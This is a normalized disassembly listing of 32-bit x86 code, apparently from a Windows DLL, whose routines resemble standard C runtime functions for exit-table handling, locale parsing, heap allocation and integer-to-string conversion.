push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_10018b82
push eax
push edi
push esi
call sub_1001b438
add esp 0x10
test eax eax
jne r-xdata
push 0x1
push edi
call sub_10019e40
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001b892
int3
mov eax esi
jmp r-xdata
mov eax r--data
pop edi
sub_10018c14
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_1001e8fd
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10019e8c
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10019e8c
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_10018cca
mov edi edi
push esi
push 0x4
push 0x20
call sub_10019e40
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10018cfb
push 0xc
push r--data
call sub_1001de70
call sub_1001d53d
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10018c14
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10018d31
mov eax [ ebp - 0x1c ]
call sub_1001deb5
retn
sub_10018d4e
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_1001bbcb
pop ecx
pop edi
sub_10018d74
push 0x8
push r--data
call sub_1001de70
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1001deb5
retn
push 0xd
call sub_1001fd54
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10018e21
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_1001750d
pop ecx
push 0xc
call sub_1001fd54
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_1001bc5a
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10018e2d
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_1001750d
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_1001bcf3
pop ecx
sub_10018e39
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001b892
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001fd87
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_10018e7a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_1001b6e0
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_100176a0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_1001e848
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_1001e848
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_1001b892
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_100176a0
test eax eax
sub_10018f99
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001b438
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001b892
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018e39
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018e39
add esp 0x14
sub_10019004
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_10019dfb
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_10018e39
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001b892
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_1001b620
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_10018e39
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_1001750d
pop ecx
push r--data
push ebx
push edi
call sub_1001fd87
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_1001750d
pop ecx
push [ ebp - 0x10 ]
call sub_1001750d
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_1001750d
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_1001750d
pop ecx
sub_10019169
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_1001c0b4
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_10018330
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_10018e7a
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_1001b620
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1001b438
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_10020381
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_1001b620
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_10018f99
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_100183c0
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1001b438
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_100183c0
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_1001e848
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
call sub_1001b892
sub_1001938a
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_1001c0b4
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_10019169
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1001b620
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_10018330
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_10019dfb
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_100183c0
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_1001b438
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001b892
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_100183c0
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rw-data
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_1001750d
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_1001e34b
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_1001750d
push [ ebx + 0x54 ]
call sub_1001750d
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_10020572
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_100196c4
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_10019004
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_1001938a
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_10019169
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1001b620
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_1001938a
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_10021ac6
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_10018330
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_100176a0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_1001e848
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1001b892
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_1001938a
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_10021b90
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_100198e0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_10019e40
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_10019e40
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_10017e85
mov [ eax ] 0xc
push edi
push 0x220
call sub_10019e40
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_1001750d
mov eax [ esi ]
mov ecx rw-data
call sub_10018d4e
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
call sub_100196c4
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_1001750d
push esi
call sub_1001750d
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_1001c729
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_1001bc5a
push [ esi ]
call sub_1001bcf3
push esi
call sub_1001750d
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_1001750d
push [ esi ]
call sub_1001bc5a
push [ esi ]
call sub_1001bcf3
push esi
call sub_1001750d
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_100199d5
push 0x14
push r--data
call sub_1001de70
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_1001c0b4
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_1001be8b
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_10019e40
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019b44
mov eax [ ebp - 0x20 ]
push 0xc
call sub_1001fd54
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_10018d4e
and [ ebp - 0x4 ] 0x0
call sub_10019b07
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_100196c4
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_1001deb5
retn
push ebx
call sub_1001bc5a
push ebx
call sub_1001bcf3
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_1001fd54
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_1001be3e
push ebx
call sub_1001bc5a
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_1001b620
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10019b13
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] edi
push [ edi ]
push rw-data
call sub_1001be3e
pop ecx
pop ecx
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
sub_10019b49
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_1001b6b7
pop ecx
call sub_10017e85
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_1001e71b
push 0x1e
call sub_1001e56c
push 0xff
call sub_1001d525
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_10017e85
mov [ eax ] esi
push ebx
call sub_1001b6b7
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_10017e85
mov [ eax ] esi
sub_10019bdd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_10021bd0
pop ecx
pop ecx
sub_10019c0c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
call sub_1001b8e4
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_10017e85
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_10017e85
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_1001b8e4
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_10019cc6
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_10019c0c
pop ebp
retn
sub_10019cf0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
push esi
cmp edi ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
call sub_10017e85
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ecx
mov [ edi ] cl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_10017e85
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov esi edi
cmp [ ebp + 0x18 ] ecx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ecx
neg ebx
adc eax ecx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push ebx
call sub_10021bf0
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov eax edx
